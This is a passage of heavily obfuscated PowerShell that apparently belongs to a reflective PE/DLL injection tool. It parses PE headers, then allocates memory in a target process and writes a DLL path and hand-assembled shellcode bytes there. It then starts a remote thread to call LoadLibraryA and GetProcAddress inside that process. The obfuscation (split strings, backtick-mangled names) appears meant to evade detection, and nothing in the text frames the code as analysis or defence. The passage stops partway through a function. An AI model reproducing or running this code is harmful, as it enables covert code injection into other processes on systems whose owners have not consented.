		${PEin`FO} = &("{0}{1}{2}" -f 'New-Ob','jec','t') ("{0}{2}{1}{3}"-f 'Sy','m.Objec','ste','t')
		
		
		${NtH`EA`dER`SiN`Fo} = &("{0}{3}{1}{2}"-f 'G','a','geNtHeaders','et-Im') -PEHandle ${PEH`AN`DLE} -Win32Types ${W`I`N32TYp`eS}
		
		
		${pEIn`FO} | &("{2}{3}{1}{0}" -f 'er','Memb','Ad','d-') -MemberType ("{1}{0}{2}{3}"-f'ePro','Not','p','erty') -Name ("{1}{2}{0}" -f 'ndle','PEH','a') -Value ${p`eha`NDLe}
		${P`eIN`Fo} | &("{0}{3}{2}{1}"-f 'Add','er','Memb','-') -MemberType ("{3}{1}{2}{0}"-f 'y','t','ePropert','No') -Name ("{4}{1}{0}{2}{3}"-f 'GE_','A','NT_HEADE','RS','IM') -Value (${nThEA`de`R`siN`Fo}."i`MaGE_`Nt_`heAD`ERS")
		${pE`InFO} | &("{2}{0}{1}"-f 'dd','-Member','A') -MemberType ("{2}{1}{0}" -f 'Property','te','No') -Name ("{1}{0}{2}{3}"-f'Heade','Nt','rsP','tr') -Value (${NTHe`ADe`Rsi`N`Fo}."NTHeaDE`RS`p`Tr")
		${p`e`inFo} | &("{0}{2}{1}" -f 'Ad','r','d-Membe') -MemberType ("{2}{1}{0}{3}" -f'teProp','o','N','erty') -Name ("{1}{0}" -f'E64Bit','P') -Value (${nthe`AD`ERs`info}."pe64B`iT")
		${p`eInfO} | &("{1}{0}{2}" -f '-Mem','Add','ber') -MemberType ("{2}{3}{0}{1}"-f 'rop','erty','No','teP') -Name ("{0}{1}{2}"-f'SizeOfI','ma','ge') -Value (${nTH`EaDerS`I`N`FO}."imagE`_`NT_`h`EaDerS"."opTi`oNA`lhEa`deR"."S`ize`o`FimAGE")
		
		if (${pe`In`FO}."pE64b`it" -eq ${tR`UE})
		{
			[IntPtr]${S`E`ctioN`H`eaDErPtR} = [IntPtr](&("{0}{2}{1}{3}"-f'A','e','dd-SignedIntAsUnsign','d') ([Int64]${p`EInFO}."ntH`Ea`De`RsptR") (  ( diR  ('V'+'aRiAb'+'LE:LISM5'+'T')).Value::"s`IzEOF"([Type]${WI`N`32TYPes}."IMAGe_nT_HE`Ad`er`S`64")))
			${pe`i`NfO} | &("{2}{0}{1}" -f'Mem','ber','Add-') -MemberType ("{2}{0}{1}{3}" -f 'per','t','NotePro','y') -Name ("{2}{3}{0}{1}"-f'e','aderPtr','Sec','tionH') -Value ${se`CtiOnheAD`e`RPTR}
		}
		else
		{
			[IntPtr]${sE`ct`ioNHeAder`P`TR} = [IntPtr](&("{2}{3}{0}{1}"-f'nedIntAs','Unsigned','Add-S','ig') ([Int64]${p`e`iNfo}."n`T`Head`ERsPtr") ( ( vaRiABlE Lism5T -VAlUEoNl)::"SI`ZeOF"([Type]${win3`2`TYPeS}."ImAGE`_NT_h`E`A`dERs32")))
			${pe`INfo} | &("{2}{0}{1}" -f'd-Membe','r','Ad') -MemberType ("{0}{1}{2}"-f'N','oteP','roperty') -Name ("{2}{3}{1}{0}{4}" -f'nHeader','io','Sec','t','Ptr') -Value ${sE`ctI`ONH`EaDer`P`TR}
		}
		
		if ((${n`T`heaDER`SI`NFO}."i`M`Age_`NT_HEad`ers"."f`I`LehEAd`er"."ChAracTe`R`iSti`cS" -band ${WI`N32`CoN`S`TAntS}."ImAGE_fiL`E`_d`Ll") -eq ${w`I`N32cOn`s`TAnTS}."IMagE_f`iL`E`_dLl")
		{
			${P`E`inFo} | &("{3}{2}{1}{0}"-f'r','mbe','d-Me','Ad') -MemberType ("{0}{2}{1}"-f'No','operty','tePr') -Name ("{0}{2}{1}" -f 'Fi','pe','leTy') -Value 'DLL'
		}
		elseif ((${Nt`heA`D`Ers`InfO}."IMage_n`T_H`eA`D`ERS"."fiLE`h`eadER"."CH`Arac`Teri`S`TICS" -band ${wI`N3`2coNS`TaNTS}."i`mAGe_F`ILE_EXe`c`UtAbLe_`ImaGE") -eq ${wIn3`2`CO`NS`TanTS}."iMA`gE_FILe_`ExEcU`T`ABle_`Im`AGE")
		{
			${Pe`iNFo} | &("{1}{0}{2}"-f '-Memb','Add','er') -MemberType ("{0}{1}{2}"-f'No','t','eProperty') -Name ("{1}{0}{2}" -f'eTyp','Fil','e') -Value 'EXE'
		}
		else
		{
			Throw ("{0}{3}{4}{5}{1}{2}"-f 'PE file ','or D','LL','is n','ot an',' EXE ')
		}
		
		return ${PeI`N`FO}
	}
	
	
	Function IMp`OrT-DLlINRem`O`TE`p`ROc`Ess
	{
		Param(
		[Parameter(positIOn=0, MAnDATOry=${T`Rue})]
		[IntPtr]
		${R`EmOt`EPr`OCHaNdLE},
		
		[Parameter(pOSITiOn=1, MANDAtoRy=${T`RuE})]
		[IntPtr]
		${I`MpORT`dl`lPAT`HpTr}
		)
		
		${ptrSi`ZE} =  ( GEt-VARiaBLe ('lIs'+'m'+'5t')).VALuE::"S`I`zEOf"([Type][IntPtr])
		
		${ImPor`TdLlp`A`Th} =  ( cHILditEm ('vA'+'RIab'+'Le'+':lISM5T')  ).VALue::("{0}{2}{1}"-f'PtrToSt','ingAnsi','r').Invoke(${ImpO`RtDLlpat`H`p`Tr})
		${dLL`Pa`ThsIzE} = [UIntPtr][UInt64]([UInt64]${i`MpOrTDLL`PA`TH}."Leng`TH" + 1)
		${r`iMPORtDLlP`At`h`ptR} = ${WIn`32F`UN`CtiONS}."ViRtU`ALa`ll`OceX"."iN`VO`Ke"(${rE`MoT`EPRoChANd`Le},  ${8`Zh}::"Ze`Ro", ${DLL`PaThs`IZE}, ${Wi`N32`COn`sta`NTs}."Me`M_C`OMmIt" -bor ${wIn32C`oN`ST`AntS}."M`eM_R`eSErVE", ${WIn`32`c`oNs`TAnts}."Pag`E_Re`AD`W`RitE")
		if (${rI`MPoRT`dL`lPA`T`HPTr} -eq   ${8`zH}::"ZE`RO")
		{
			Throw ("{1}{3}{7}{8}{4}{0}{6}{5}{2}"-f'mo','Unable','s',' to ','emory in the re','e proces','t','allocate ','m')
		}

		[UIntPtr]${nuMbyt`e`s`WR`ItTEN} =  ${vFa`9u}::"z`Ero"
		${s`Ucc`esS} = ${w`In3`2`FuN`ctions}."w`RiTEprOc`eSSmE`MoRy"."In`Vo`KE"(${R`Em`OteP`Ro`CH`ANdLE}, ${r`imPoR`Tdll`PAtHP`TR}, ${importDllp`A`ThP`TR}, ${DL`l`PA`THSIzE}, [Ref]${N`UMBYT`eSwrI`TtEN})
		
		if (${Su`ccesS} -eq ${FAL`sE})
		{
			Throw ("{4}{1}{12}{7}{10}{11}{6}{3}{8}{2}{13}{9}{0}{5}" -f'r','e ','ote pro','LL path to re','Unabl','y',' D','wr','m','ss memo','i','te','to ','ce')
		}
		if (${d`l`LPA`ThsiZe} -ne ${Numb`y`Tes`wRittEn})
		{
			Throw ((("{10}{0}{11}{8}{5}{7}{12}{19}{17}{2}{13}{14}{15}{4}{20}{16}{6}{1}{18}{3}{9}{21}{22}" -f'qXt w',' the r','n ','m',' t','d amou','o','nt of byt','ecte','ote','Didn3','rite the exp','es','writing a ','DLL p','ath','t','whe','e',' ','o load ',' pro','cess'))."re`p`LAcE"('3qX',[STrInG][CHaR]39))
		}
		
		${kernE`l32`H`AND`Le} = ${w`In3`2fUn`ctIo`Ns}."gEtm`O`dUL`EHaN`dlE"."Inv`okE"(("{2}{1}{0}"-f '2.dll','el3','kern'))
		${l`oadl`i`Brarya`ADdR} = ${wI`N32`FUN`CtIOnS}."GET`pRoCa`d`DR`EsS"."IN`VO`KE"(${kErNE`L3`2haN`Dle}, ("{0}{1}{2}{3}" -f 'LoadLibr','a','r','yA')) 
		
		[IntPtr]${dl`LAd`DRess} =  ${8`zh}::"zE`RO"
		
		
		if (${P`eiNfO}."pE64`B`it" -eq ${Tr`Ue})
		{
			
			${loaD`LIB`RarYa`Re`TmEM} = ${Wi`N32`FuNCti`o`NS}."vir`T`U`ALAL`locEX"."i`N`VokE"(${ReMOtepRO`c`hA`N`dle},   ( vaRIaBLE  8Zh -VA)::"z`ErO", ${dl`l`pAtHSi`Ze}, ${Wi`N32C`On`sta`NtS}."mem`_`CoMmIT" -bor ${WiN3`2`CON`s`TaNtS}."ME`M_`RESeR`Ve", ${win32CON`S`Tan`Ts}."PAg`e_`ReADWR`ite")
			if (${l`oADlIBRaRY`ArE`TM`em} -eq  (  lS ("vAr"+"iabL"+"e:"+"8zH")).vaLUE::"z`ERO")
			{
				Throw ("{2}{18}{6}{11}{0}{17}{19}{12}{1}{15}{10}{14}{8}{5}{20}{16}{4}{7}{9}{3}{13}"-f' ',' th','U','brary',' ','or th','able','Loa','f','dLi','mot',' to','te memory in','A','e process ','e re',' of','a','n','lloca','e return value')
			}
			
			
			
			${LO`AdL`i`BRAR`YSc1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${lOADlI`B`RaR`YsC2} = @(0x48, 0xba)
			${l`oA`dLIBRar`YSC3} = @(0xff, 0xd2, 0x48, 0xba)
			${lOA`DLIBr`A`RY`Sc4} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			${SC`l`eNGtH} = ${Lo`Ad`Lib`Ra`Rysc1}."l`eNGtH" + ${LOa`D`LIB`Rary`sc2}."le`NGtH" + ${lO`AdL`iBRaRY`Sc3}."l`ENGtH" + ${l`oAdLi`Br`Ar`ysC4}."lEN`gth" + (${PT`RS`ize} * 3)
			${Sc`p`SMEM} =  ${Lism`5t}::("{3}{2}{0}{1}" -f 'o','cHGlobal','ll','A').Invoke(${Scl`E`NgTH})
			${SCPSmEMoR`IGI`N`Al} = ${ScPs`M`em}
			
			&("{0}{3}{1}{4}{2}"-f'Wri','te','oMemory','te-By','sT') -Bytes ${Lo`AD`Li`BRa`Rysc1} -MemoryAddress ${sCP`SmEm}
			${s`cPsMeM} = &("{3}{1}{0}{2}"-f 'edIntAsUnsigne','Sign','d','Add-') ${scPS`m`em} (${LoA`Dl`IBRa`Rysc1}."L`e`NGTH")
			 ${l`ism5t}::("{1}{0}{2}" -f 'ucture','Str','ToPtr').Invoke(${riMp`OrT`dll`PATH`PTr}, ${sc`PS`MEM}, ${faL`sE})
			${sCpSM`Em} = &("{3}{0}{2}{1}{4}" -f'Sig','ntAs','nedI','Add-','Unsigned') ${S`CPSm`EM} (${p`T`RSIze})
			&("{0}{3}{2}{1}"-f'Wr','y','ToMemor','ite-Bytes') -Bytes ${lOa`d`L`ibra`RYSC2} -MemoryAddress ${sC`pSM`em}
			${Sc`PS`mEM} = &("{2}{3}{0}{5}{1}{4}"-f 'S','edIntAsUnsign','Ad','d-','ed','ign') ${sC`pS`mem} (${LOa`DlI`BRA`R`Ysc2}."LE`NGTh")
			 (get-vArIABlE lISM5T  ).vAlUE::("{3}{2}{4}{1}{0}"-f 'r','oPt','r','St','uctureT').Invoke(${LoAd`l`iBr`ARY`AaDdr}, ${s`CpS`mEM}, ${f`AL`Se})
			${S`cPs`Mem} = &("{2}{0}{5}{1}{6}{3}{4}"-f 'd-Si','ned','Ad','sUnsig','ned','g','IntA') ${sCps`M`Em} (${p`TRsIze})
			&("{3}{1}{2}{5}{0}{4}" -f 'oMe','rite','-Byt','W','mory','esT') -Bytes ${LoaD`Li`Br`Arys`c3} -MemoryAddress ${SC`P`SmEm}
			${sc`Ps`mem} = &("{3}{7}{5}{1}{6}{4}{2}{0}"-f'd','t','igne','Add-S','Uns','edIn','As','ign') ${S`CPs`mEM} (${L`OaD`lI`BrAr`ysc3}."lE`N`GTH")
			 (  gEt-VARiable lISM5T).VALuE::("{1}{3}{4}{0}{2}"-f 'tureT','St','oPtr','r','uc').Invoke(${lO`AD`Li`BRArYARETmEM}, ${s`C`PSMem}, ${f`A`LSE})
			${sCpS`m`em} = &("{4}{2}{3}{1}{0}" -f 'gned','ntAsUnsi','gn','edI','Add-Si') ${Sc`P`SMEm} (${P`TR`SIZE})
			&("{4}{3}{1}{2}{0}" -f 'y','sToMemo','r','te','Write-By') -Bytes ${L`OAd`L`iBraRYsc4} -MemoryAddress ${S`cp`SMeM}
			${SC`psM`Em} = &("{2}{1}{3}{4}{0}" -f 'Unsigned','d','A','d','-SignedIntAs') ${SCPS`m`eM} (${LO`A`D`lIbrArySc4}."lEnG`Th")

			
			${Rs`CaD`dr} = ${wIN`32`FUncT`ioNS}."v`i`RtUalA`llocEX"."In`V`oKE"(${r`Em`OTEp`RochaN`dLE},   ( VarIablE  8zH  -vaL)::"ZE`Ro", [UIntPtr][UInt64]${sclE`NG`Th}, ${wIn`32c`on`StaN`Ts}."me`M`_`COmMIt" -bor ${w`In3`2coNst`An`Ts}."MEm_r`E`SeR`VE", ${W`iN`32co`NSt`AnTS}."pAG`e_EX`eCUtE`_`Re`A`dwriTE")
			if (${RSc`A`DDR} -eq  (GeT-variaBlE  8zH).vAlUe::"z`eRO")
			{
				Throw ("{1}{9}{4}{0}{5}{7}{8}{2}{3}{6}{10}"-f'locate me','Unable ','n',' th',' al','m','e remote process for shellco','or','y i','to','de')
			}
			
			${s`Ucce`ss} = ${wI`N`32FUncTiONS}."w`RITEpROceS`s`MeMOrY"."Invo`Ke"(${REM`ot`EpRo`cHANDlE}, ${rs`C`AddR}, ${ScpsM`Emo`R`iGi`Nal}, [UIntPtr][UInt64]${Sc`leNG`Th}, [Ref]${nUMB`yte`s`WRITTEn})
			if ((${S`Uc`ceSs} -eq ${F`ALse}) -or ([UInt64]${N`UM`BYt`esWriT`TeN} -ne [UInt64]${Sc`len`gtH}))
			{
				Throw ("{8}{3}{6}{2}{7}{1}{9}{4}{0}{5}" -f's memory','e pr','rit','nabl','s','.','e to w','e shellcode to remot','U','oce')
			}
			
			${Rt`hREa`DhA`NDLE} = &("{5}{3}{2}{1}{4}{0}" -f 'd','emot','e-R','eat','eThrea','Cr') -ProcessHandle ${ReMo`Te`PrO`c`Ha`NdLE} -StartAddress ${RsC`A`dDR} -Win32Functions ${win`32funC`T`I`oNS}
			${R`Es`Ult} = ${w`In`32f`UnC`TiOnS}."WAIt`Fors`INGl`eoBJEct"."inv`OKe"(${Rt`hrEAdH`A`N`dlE}, 20000)
			if (${rE`S`ULT} -ne 0)
			{
				Throw ("{8}{2}{13}{9}{10}{11}{14}{12}{0}{1}{7}{4}{6}{3}{5}"-f 'e','a','all',' fa','et','iled.','ProcAddress','d to call G','C','o Crea','te','Remote','r',' t','Th')
			}
			
			
			[IntPtr]${R`eT`URnval`M`eM} =   ${li`S`M5T}::("{1}{0}{3}{2}" -f 'llocHGl','A','bal','o').Invoke(${pt`R`sIZe})
			${R`eSUlt} = ${wIn3`2`Fun`cTiONS}."Re`AdProC`ES`sm`e`MorY"."iNVo`Ke"(${Re`Mot`Eproc`H`ANDle}, ${lOa`d`li`BRAR`YArETmEM}, ${rET`Ur`Nv`ALMEm}, [UIntPtr][UInt64]${PTr`S`izE}, [Ref]${N`U`mBY`TesWRItTeN})
			if (${re`s`UlT} -eq ${F`Al`sE})
			{
				Throw ("{3}{4}{1}{0}{6}{7}{5}{2}"-f 'ProcessM','Read','iled','Cal','l to ',' fa','e','mory')
			}
			[IntPtr]${dl`lA`d`drESS} =   (  vaRiAblE ("lism"+"5"+"T") -Val)::"PTrT`Ost`Ructure"(${re`TuRnVAlM`eM}, [Type][IntPtr])

			${W`i`N32FuNCtIO`Ns}."V`ir`T`UALfreEEx"."i`NvokE"(${RE`MOTEp`ROC`hAnDlE}, ${LoadLI`Br`A`RYar`ETMem}, [UIntPtr][UInt64]0, ${WI`N32cOnS`TaNTs}."mEm_R`el`e`ASe") | &("{1}{0}"-f'l','Out-Nul')
			${w`iN32FUn`CtIO`Ns}."virTUA`LfREe`eX"."i`NvokE"(${rE`mO`TEproCh`AnDLE}, ${rsCAd`dR}, [UIntPtr][UInt64]0, ${Win`32C`On`sTAN`Ts}."MeM`_Re`lE`Ase") | &("{2}{0}{1}"-f 'ut','-Null','O')
		}
		else
		{
			[IntPtr]${RTHRe`AD`h`A`NDLE} = &("{2}{3}{1}{0}{4}" -f 'moteThre','Re','Crea','te-','ad') -ProcessHandle ${RE`M`OtePRo`C`haN`dLE} -StartAddress ${LoA`D`lIbR`AryAADDr} -ArgumentPtr ${rImporTD`L`LPA`ThPtR} -Win32Functions ${WIN32`FUn`C`TI`ons}
			${RE`S`ULt} = ${win32fUn`CT`IONs}."wait`F`o`RsiNglEoBj`e`CT"."INv`okE"(${RThr`EadhA`NDLE}, 20000)
			if (${R`E`sulT} -ne 0)
			{
				Throw ("{13}{1}{11}{12}{4}{8}{7}{10}{14}{3}{5}{9}{15}{0}{6}{2}"-f's f','ea','.','cA','teThread','d','ailed','o ',' t','dre','cal','teRe','mo','Call to Cr','l GetPro','s')
			}
			
			[Int32]${eX`It`cOde} = 0
			${rES`ULt} = ${Win`32F`UnCt`iOns}."GEtE`x`iTcodEth`READ"."INvO`KE"(${RtHre`AD`hAnDLE}, [Ref]${exIT`c`o`De})
			if ((${reS`UlT} -eq 0) -or (${E`Xi`TCO`De} -eq 0))
			{
				Throw ("{0}{4}{7}{6}{1}{3}{5}{2}"-f'Call to G','d','ailed',' ','et','f','tCodeThrea','Exi')
			}
			
			[IntPtr]${DllAdD`R`esS} = [IntPtr]${E`XITc`odE}
		}
		
		${wIN3`2F`Unc`T`Ions}."V`iRT`UAl`F`ReeEx"."iNV`oke"(${rEm`oTe`P`ROchA`NDLe}, ${RiMpOrtDll`P`Ath`pTr}, [UIntPtr][UInt64]0, ${WIN3`2ConStA`N`Ts}."mem`_`RelEasE") | &("{2}{1}{0}"-f'Null','-','Out')
		
		return ${DLl`Ad`dRE`Ss}
	}
	
	
	Function Ge`T`-remO`Tepro`Cad`DREss
	{
		Param(
		[Parameter(pOsiTiON=0, mandatORY=${T`Rue})]
		[IntPtr]
		${rEMOt`e`PR`OCha`Ndle},
		
		[Parameter(pOSItION=1, manDATORY=${t`RUE})]
		[IntPtr]
		${reMOT`edlLhA`N`D`LE},
		
		[Parameter(PoSITiOn=2, mAndATOrY=${TR`UE})]
		[IntPtr]
		${F`UnCtiOnn`AMEP`TR},

        [Parameter(POsItiOn=3, manDAToRY=${T`RUE})]
        [Bool]
        ${lOa`d`ByO`RDi`Nal}
		)

		${pTRs`i`zE} =  ${lI`SM5T}::"si`ZEof"([Type][IntPtr])

		[IntPtr]${r`F`UNcnAMep`Tr} =   (  GET-variaBLe  8zH -Val  )::"Z`eRo"   
        
        if (-not ${L`OAdbYOrd`inal})
        {
        	${funcT`io`NNA`ME} =   ${L`isM`5T}::("{0}{2}{1}"-f'Ptr','tringAnsi','ToS').Invoke(${F`UNctIOn`NA`mE`ptR})

		    
		    ${FuNctI`oNn`Ame`sI`ze} = [UIntPtr][UInt64]([UInt64]${fUNc`TIO`NnaME}."LEN`gTH" + 1)
		    ${R`F`UNCNAm`ePtr} = ${w`iN3`2FUNCtIO`NS}."vi`RtuAlA`LLOCeX"."InVO`KE"(${remOT`epROCH`And`le},  (  GET-VariabLE 8ZH -VALUe )::"Z`eRo", ${fUNcT`I`ON`Na`mESIze}, ${w`IN3`2cons`Tan`TS}."MEM`_`C`oMmIT" -bor ${W`IN32coNsTan`TS}."Mem`_R`ESERVe", ${wIn`32`cONSt`ANts}."Pag`E_RE`AdwR`i`Te")
		    if (${R`FUN`Cn`Am`eptR} -eq   (  gET-VARIAble 8ZH  -VA )::"Z`ERo")
		    {
			    Throw ("{7}{2}{1}{11}{4}{0}{3}{10}{8}{5}{6}{9}{12}" -f' memory','to','ble ',' ','ate',' th','e r','Una','n','emote','i',' alloc',' process')
		    }

		    [UIntPtr]${nU`mbyTesw`RI`TT`En} =   ( gI VaRiAbLe:vFa9U  ).VaLue::"Ze`Ro"
		    ${S`UCCE`ss} = ${Win32fu`Nc`TIO`Ns}."w`Ri`TEprOcEs`sM`e`MOrY"."I`NVOKE"(${REmot`epr`ocH`AnDlE}, ${rfU`NCn`AmEpTr}, ${Func`TI`O`N`NAMEpTR}, ${F`Un`CT`IONNAMe`si`ZE}, [Ref]${N`UMB`Yte`swritTeN})
		    if (${sUCC`e`SS} -eq ${f`AlsE})
		    {
			    Throw ("{3}{8}{0}{1}{6}{4}{7}{5}{12}{10}{9}{2}{11}"-f 'o',' w','rocess ','Unabl','it','DLL','r','e ','e t',' p',' to remote','memory',' path')
		    }
		    if (${FU`N`CTiOn`NA`MeSize} -ne ${nuMbY`TeS`W`RiTt`EN})
		    {
			    Throw ((("{4}{13}{10}{8}{9}{1}{12}{3}{2}{11}{14}{15}{6}{7}{5}{0}" -f'rocess','he','it',' wr','Didn{0','emote p','a','d to the r','ted',' amount of bytes w','e expec','in','n','}t write th','g',' a DLL path to lo'))  -f[chAr]39)
		    }
        }
        
        else
        {
            ${r`FU`NcNAMePTr} = ${fUnCT`iONNam`eP`TR}
        }
		
		
		${kernE`L`32hA`NDle} = ${WIn`3`2FUnCT`i`oNs}."geT`mOD`U`lEhanDLE"."iNV`okE"(("{2}{0}{1}"-f'el32.dl','l','kern'))
		${GeT`P`ROCaD`DrES`sAdDR} = ${w`i`N32fu`NCTiO`NS}."G`Et`Pro`cADDR`ESs"."i`N`VoKe"(${KeR`N`eL32HAn`d`Le}, ("{0}{3}{2}{1}"-f'GetPro','ss','re','cAdd')) 

		
		
		${GET`pROcAD`D`RE`SsrE`Tmem} = ${WI`N32`FuNCTi`O`NS}."VIrT`UaLA`llOceX"."In`VO`kE"(${rEmO`TE`proChAND`le},  ${8`Zh}::"Ze`Ro", [UInt64][UInt64]${PTR`si`zE}, ${W`iN32`C`onStANts}."MEm_`cO`Mm`IT" -bor ${WIN32cOn`st`A`N`TS}."m`Em_`ReSerVE", ${Win32`COn`STANTs}."PAGe_rea`DwR`ItE")
		if (${gETP`RoCaDDREs`Sre`T`MEM} -eq   (Ls ("Va"+"riaBlE:"+"8zh")  ).vAluE::"Ze`RO")
		{
			Throw ("{20}{8}{19}{7}{12}{13}{15}{16}{10}{21}{9}{0}{4}{18}{3}{22}{1}{17}{11}{14}{6}{5}{2}"-f'the remote pr','e re','ress',' f','oc','etProcAdd','e of G','o','able','in ',' memor','urn ',' ','al','valu','loc','ate','t','ess',' t','Un','y ','or th')
		}
		
		
		
		
		[Byte[]]${geTPrO`cAD`DREs`SSc} = @()
		if (${PEI`Nfo}."P`E`64bIt" -eq ${t`RUE})
		{
			${ge`T`pROCAdDRE`Sss`C1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${gETPrOc`A`d`DrESss`C2} = @(0x48, 0xba)
			${GEtP`R`OC`A`DdreSS`sC3} = @(0x48, 0xb8)
			${Ge`TPR`Oc`Ad`DREss`Sc4} = @(0xff, 0xd0, 0x48, 0xb9)
			${GEtP`ROCAdd`RES`Ssc5} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${GetP`ROCa`D`dr`esSSC1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${gET`p`RoC`A`ddRESs`sc2} = @(0xb9)
			${GETpro`c`AdDr`Es`SSc3} = @(0x51, 0x50, 0xb8)
			${G`E`Tp`RoC`AddRESss`C4} = @(0xff, 0xd0, 0xb9)
			${gET`pR`oCaddRes`SSc5} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${S`Cle`NGth} = ${getp`RocA`d`drEssSc1}."L`eNgth" + ${GET`P`RocaD`dreSSSC2}."leNg`TH" + ${Ge`Tp`RoCADDr`EsSsC3}."l`eNgtH" + ${getpRo`CADD`R`ESs`s`c4}."LEng`TH" + ${Ge`TPrOCaDd`Ress`sC5}."lE`N`gth" + (${P`Tr`siZe} * 4)
		${s`Cp`SMeM} =   ( ls  ('vaRiaBLE:lI'+'SM5'+'t')  ).valUe::("{1}{2}{0}{3}"-f'o','Al','locHGl','bal').Invoke(${s`cL`eNGth})
		${s`cP`smeMori`GiN`AL} = ${S`cpS`mEM}
		
		&("{1}{4}{0}{3}{2}"-f 'o','W','y','Memor','rite-BytesT') -Bytes ${G`e`TPrOcaDDr`Ess`SC1} -MemoryAddress ${SC`P`smEM}
		${s`c`psmem} = &("{3}{2}{0}{1}{5}{4}{6}" -f 'In','tAsUn','d','Add-Signe','e','sign','d') ${SCpS`m`eM} (${GEt`proc`A`d`DrEs`SSC1}."LE`NGtH")
		  (Dir ('V'+'a'+'rIAb'+'lE:LISM5T')).vAluE::("{3}{2}{1}{0}"-f 'Ptr','reTo','ctu','Stru').Invoke(${re`M`OTe`DLlhandlE}, ${S`Cp`smeM}, ${f`A`lse})
		${sC`P`smeM} = &("{5}{0}{4}{2}{3}{1}" -f 'd-','signed','AsU','n','SignedInt','Ad') ${ScPs`M`em} (${Ptr`Si`ze})
		&("{4}{1}{2}{5}{0}{3}"-f 'o','ytes','ToMe','ry','Write-B','m') -Bytes ${get`pro`CaDDre`ssS`C2} -MemoryAddress ${sC`ps`mEM}
		${SC`pSmem} = &("{1}{0}{4}{2}{3}" -f 'd-SignedI','Ad','nsign','ed','ntAsU') ${scPS`M`EM} (${Ge`Tpr`Oc`AddreSSSc2}."l`eN`gth")
		 ${L`IS`M5t}::("{2}{1}{0}{4}{3}"-f'tu','ruc','St','eToPtr','r').Invoke(${rf`UncnaMe`PtR}, ${sCp`SM`EM}, ${F`AL`SE})
		${S`Cpsm`EM} = &("{1}{7}{0}{3}{2}{6}{4}{5}"-f 'e','Add-','Int','d','nsign','ed','AsU','Sign') ${S`cps`mem} (${pt`RS`IzE})
		&("{3}{1}{2}{0}{4}" -f'o','e','-BytesToMem','Writ','ry') -Bytes ${G`e`TpRO`CaD`dRe`ssSC3} -MemoryAddress ${sCPS`M`Em}
		${S`C`PSMem} = &("{1}{4}{0}{3}{5}{2}{6}" -f'd-S','A','ntA','ign','d','edI','sUnsigned') ${S`cpsMem} (${gE`TP`RO`C`AdDrEssSC3}."L`Ength")
		 (  VARiABle  ("lIs"+"M5t") -VAlUEON  )::("{1}{2}{0}" -f 'oPtr','Struc','tureT').Invoke(${get`Pr`O`cAd`DresSAdDr}, ${sC`P`Smem}, ${FaL`Se})
		${S`cps`meM} = &("{4}{6}{5}{1}{0}{2}{3}" -f 'IntAsUn','d','si','gned','Add-Sig','e','n') ${S`CpSmEM} (${PtR`sizE})
		&("{0}{1}{3}{2}"-f 'W','r','mory','ite-BytesToMe') -Bytes ${ge`TpRo`CAD`DRESSSc4} -MemoryAddress ${sC`PSmEm}
		${Sc`Ps`meM} = &("{3}{4}{2}{1}{0}"-f 'igned','tAsUns','In','Add','-Signed') ${SC`PsM`Em} (${ge`Tpr`O`CaD`dRESssC4}."lEn`gth")
		 (  get-ChIlDitEM vArIable:lIsM5T).VALUE::("{1}{3}{2}{4}{0}"-f 'Ptr','St','c','ru','tureTo').Invoke(${gE`T`P`R`oCADdrESSr`ETMEm}, ${scP`S`MEM}, ${FAl`SE})
		${S`C`PSMEm} = &("{3}{2}{0}{4}{1}" -f'nedIn','signed','g','Add-Si','tAsUn') ${s`CPSMeM} (${p`Tr`sIZE})
		&("{3}{4}{1}{0}{5}{2}"-f'e-Byte','it','ory','W','r','sToMem') -Bytes ${G`eTP`ROC`ADd`RES`ssc5} -MemoryAddress ${S`c`psMEm}
		${Sc`pSMEM} = &("{2}{1}{4}{3}{0}"-f 'Unsigned','n','Add-Sig','dIntAs','e') ${ScPs`Mem} (${GeTPrO`Cad`DrES`s`sc5}."LENG`Th")
		
		${rs`cad`DR} = ${Wi`N`32F`U`NctIOns}."ViRt`UA`La`LLOCeX"."I`NvO`Ke"(${rE`Mo`TEPrOChaN`dLe},  (VaRIaBLE  8zh  ).vAluE::"Z`ERO", [UIntPtr][UInt64]${sC`len`gth}, ${w`in32cO`Nst`ANTs}."mEm_`cO`MmiT" -bor ${w`iN`32cO`NSTantS}."me`m_R`eserVE", ${Wi`N3`2cOn`STANTS}."pAGE_exE`C`UT`e_reaD`W`RI`Te")
		if (${rs`cA`DDr} -eq   (  diR  ("v"+"AR"+"Ia"+"bLE:8Zh") ).vALUe::"Ze`Ro")
		{
			Throw ("{0}{6}{10}{7}{15}{1}{12}{2}{5}{14}{8}{4}{9}{13}{3}{11}"-f 'Un','te','em','cess for shellc','t','ory','abl',' to a',' the remo','e ','e','ode',' m','pro',' in','lloca')
		}
		[UIntPtr]${numb`YtES`W`R`ItTeN} =  ${v`Fa9U}::"z`ERO"
		${Suc`C`eSS} = ${w`IN3`2`FunCT`iONs}."wr`IT`epR`oC`ESsMeMO`RY"."Inv`Oke"(${remOTe`p`R`OCHandle}, ${rScAd`DR}, ${sCps`mEMoR`IGi`NAl}, [UIntPtr][UInt64]${s`CLeN`GtH}, [Ref]${n`UMbYTE`s`wRITten})
		if ((${sU`CCe`ss} -eq ${f`AlsE}) -or ([UInt64]${NUMby`T`ES`wRi`TTen} -ne [UInt64]${SCL`E`NGTH}))
		{
			Throw ("{9}{0}{14}{15}{5}{6}{8}{11}{13}{3}{10}{7}{1}{12}{2}{4}"-f'able t','pro','s memor',' to','y.','i','te she','emote ','ll','Un',' r','co','ces','de','o ','wr')
		}
		
		${rthRe`Ad`ha`NDlE} = &("{3}{4}{2}{1}{0}" -f 'ad','Thre','e-Remote','Crea','t') -ProcessHandle ${REm`O`TE`pRO`cha`Ndle} -StartAddress ${rsCA`D`dR} -Win32Functions ${WiN3`2`FUNCtioNs}
		${RE`su`LT} = ${wIn`32f`UnC`TiONS}."W`A`ItForSiNGl`EObje`ct"."inVO`kE"(${rt`hReaDh`And`Le}, 20000)
